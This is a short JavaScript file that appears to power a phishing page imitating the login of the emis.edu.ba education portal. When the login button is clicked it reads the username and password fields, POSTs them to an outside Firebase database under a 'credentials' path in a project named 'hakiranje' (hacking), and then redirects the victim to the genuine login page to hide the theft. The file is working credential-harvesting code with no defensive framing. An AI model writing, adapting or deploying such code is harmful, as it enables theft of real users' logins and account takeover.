const userInputs = document.querySelectorAll("input")
const submitButton = document.getElementById("prijava")

const submitFormHandler = async (e) => {
  e.preventDefault()
  console.log("submited")
  const username = userInputs[0].value
  const password = userInputs[1].value
  await fetch(
    "https://hakiranje-efee3-default-rtdb.europe-west1.firebasedatabase.app/credentials.json",
    {
      method: "POST",
      body: JSON.stringify({ username, password }),
      headers: { "Content-Type": "application/json" },
    }
  )
  window.location.replace("https://emis.edu.ba/#/auth/prijava")
}

submitButton.addEventListener("click", submitFormHandler)
